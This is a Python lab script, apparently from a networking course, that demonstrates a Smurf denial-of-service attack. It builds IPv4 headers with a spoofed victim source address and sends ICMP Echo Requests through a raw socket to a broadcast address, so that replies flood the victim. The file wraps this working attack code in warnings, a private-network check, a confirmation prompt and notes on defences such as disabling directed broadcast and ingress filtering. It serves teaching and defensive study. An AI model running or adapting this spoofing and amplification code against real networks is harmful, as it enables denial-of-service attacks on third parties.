"""Smurf Attack Demonstration (for educational purposes only).

WARNING: This is a demonstration of a DoS attack vector.
ONLY USE IN CONTROLLED, ISOLATED TEST ENVIRONMENTS.
DO NOT USE AGAINST PRODUCTION SYSTEMS OR NETWORKS YOU DON'T OWN.

Smurf Attack Mechanism:
1. Attacker sends ICMP Echo Request to broadcast address (e.g., 192.168.1.255)
2. Source IP is spoofed to victim's IP
3. All hosts in broadcast domain reply to victim
4. Amplification: 1 packet -> N replies (N = hosts in broadcast domain)

Protection:
- Disable directed broadcast on routers: "no ip directed-broadcast"
- Ingress filtering (BCP 38 / RFC 2827)
- Rate limiting ICMP
- Disable IP spoofing at network edge
"""

import socket
import struct
import time
import random
import sys
import os
from typing import Tuple

from lab5.icmp_utils import (
    ICMPPacket, ICMPType,
    calculate_checksum, create_echo_request,
    create_raw_socket, send_icmp
)


def build_ip_header(
    src_ip: str,
    dst_ip: str,
    protocol: int = socket.IPPROTO_ICMP,
    ttl: int = 64,
    total_len: int = 0,  # Will be calculated
    id_: int = 0,
) -> bytes:
    """Build IPv4 header with spoofed source."""
    # Version=4, IHL=5 (no options)
    version_ihl = (4 << 4) | 5
    tos = 0
    # total_len will be filled later
    if id_ == 0:
        id_ = random.randint(1, 65535)
    flags_frag = 0  # No fragmentation
    checksum = 0  # Will calculate

    src_bytes = socket.inet_aton(src_ip)
    dst_bytes = socket.inet_aton(dst_ip)

    # Pack without checksum first
    header = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl, tos, 0, id_, flags_frag, ttl, protocol, 0,
        src_bytes, dst_bytes
    )

    # Calculate checksum
    checksum = calculate_checksum(header)

    # Repack with correct checksum and total_len
    total_len = len(header)  # Will add payload later
    header = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl, tos, total_len, id_, flags_frag, ttl, protocol, checksum,
        src_bytes, dst_bytes
    )
    return header


def build_icmp_packet(identifier: int, sequence: int, payload_size: int = 56) -> bytes:
    """Build ICMP Echo Request packet."""
    packet = create_echo_request(identifier, sequence, payload_size)
    return packet.pack()


def smurf_attack(
    victim_ip: str,
    broadcast_ip: str,
    count: int = 10,
    interval: float = 0.1,
    payload_size: int = 56,
    interface: str = "0.0.0.0",
) -> None:
    """
    Demonstrate Smurf attack by sending spoofed ICMP Echo Requests to broadcast.
    
    Args:
        victim_ip: IP address to spoof as source (the victim)
        broadcast_ip: Broadcast address of target network (e.g., 192.168.1.255)
        count: Number of packets to send
        interval: Time between packets
        payload_size: ICMP payload size
        interface: Interface to bind to
    
    WARNING: This sends packets with spoofed source IP.
    Only use in isolated test networks!
    """
    print("=" * 70)
    print("SMURF ATTACK DEMONSTRATION")
    print("=" * 70)
    print(f"Victim (spoofed source): {victim_ip}")
    print(f"Broadcast target: {broadcast_ip}")
    print(f"Packets: {count}, Interval: {interval}s")
    print("=" * 70)
    print()
    print("WARNING: This demonstrates a DoS attack vector.")
    print("Only run in controlled, isolated test environments!")
    print("Do NOT use against production systems.")
    print()

    # Verify this is a private/test network
    if not _is_private_network(broadcast_ip):
        print("ERROR: Broadcast IP does not appear to be a private network.")
        print("Refusing to send to public broadcast address.")
        return

    try:
        # Create raw socket with IP_HDRINCL for custom IP headers
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        # Enable broadcast
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    except (AttributeError, OSError) as e:
        print(f"Failed to create raw socket: {e}")
        print("Requires root/Admin privileges.")
        return

    identifier = random.randint(1, 65535)
    sequence = 0

    print("Sending spoofed ICMP Echo Requests...")
    for i in range(count):
        sequence += 1

        # Build ICMP packet
        icmp_payload = build_icmp_packet(identifier, sequence, payload_size)

        # Build IP header with spoofed source
        ip_header = build_ip_header(victim_ip, broadcast_ip, total_len=20 + len(icmp_payload))

        # Combine
        packet = ip_header + icmp_payload

        try:
            sock.sendto(packet, (broadcast_ip, 0))
            print(f"  Sent packet {i+1}/{count} (seq={sequence})")
        except OSError as e:
            print(f"  Send error: {e}")
            break

        time.sleep(interval)

    sock.close()
    print("\nDone. Check Wireshark on victim machine to see amplified replies.")
    print("Expected: Each host in broadcast domain replies to victim_ip.")


def _is_private_network(ip: str) -> bool:
    """Check if IP is in private address space (RFC 1918)."""
    try:
        parts = list(map(int, ip.split('.')))
        # 10.0.0.0/8
        if parts[0] == 10:
            return True
        # 172.16.0.0/12
        if parts[0] == 172 and 16 <= parts[1] <= 31:
            return True
        # 192.168.0.0/16
        if parts[0] == 192 and parts[1] == 168:
            return True
        # Loopback
        if parts[0] == 127:
            return True
        # Link-local
        if parts[0] == 169 and parts[1] == 254:
            return True
    except (ValueError, IndexError):
        pass
    return False


def demo_with_wireshark_instructions():
    """Print instructions for Wireshark capture."""
    print("""
Wireshark Capture Instructions:
===============================

1. On VICTIM machine:
   - Start Wireshark capture on network interface
   - Filter: icmp and ip.src == <broadcast_network> and ip.dst == <victim_ip>
   - Or just: icmp && ip.dst == <victim_ip>

2. On ATTACKER machine (this script):
   - Run: python -m lab5.smurf --victim <victim_ip> --broadcast <broadcast_ip>

3. Expected Wireshark output:
   - ICMP Echo Request from <victim_ip> to <broadcast_ip> (spoofed)
   - Multiple ICMP Echo Replies from various hosts in broadcast domain to <victim_ip>
   - This demonstrates the amplification effect

4. Protection verification:
   - With "no ip directed-broadcast" on router: no replies
   - With ingress filtering: spoofed packets dropped at edge
""")


def main():
    import argparse
    parser = argparse.ArgumentParser(
        description="Smurf Attack Demonstration (EDUCATIONAL ONLY)",
        epilog="WARNING: Only use in isolated test networks!"
    )
    parser.add_argument("--victim", required=True, help="Victim IP (spoofed source)")
    parser.add_argument("--broadcast", required=True, help="Broadcast IP (target network)")
    parser.add_argument("-c", "--count", type=int, default=5, help="Number of packets")
    parser.add_argument("-i", "--interval", type=float, default=0.2, help="Interval between packets")
    parser.add_argument("-s", "--size", type=int, default=56, help="ICMP payload size")
    parser.add_argument("--wireshark-help", action="store_true", help="Show Wireshark instructions")

    args = parser.parse_args()

    if args.wireshark_help:
        demo_with_wireshark_instructions()
        return

    # Safety check
    if not _is_private_network(args.broadcast):
        print("ERROR: Broadcast IP must be in private address space (RFC 1918).")
        print("This tool only works on isolated test networks.")
        sys.exit(1)

    if not _is_private_network(args.victim):
        print("WARNING: Victim IP should also be in private address space for safety.")

    confirm = input("This sends spoofed packets. Continue? [y/N]: ")
    if confirm.lower() != 'y':
        print("Aborted.")
        return

    smurf_attack(
        victim_ip=args.victim,
        broadcast_ip=args.broadcast,
        count=args.count,
        interval=args.interval,
        payload_size=args.size,
    )


if __name__ == "__main__":
    main()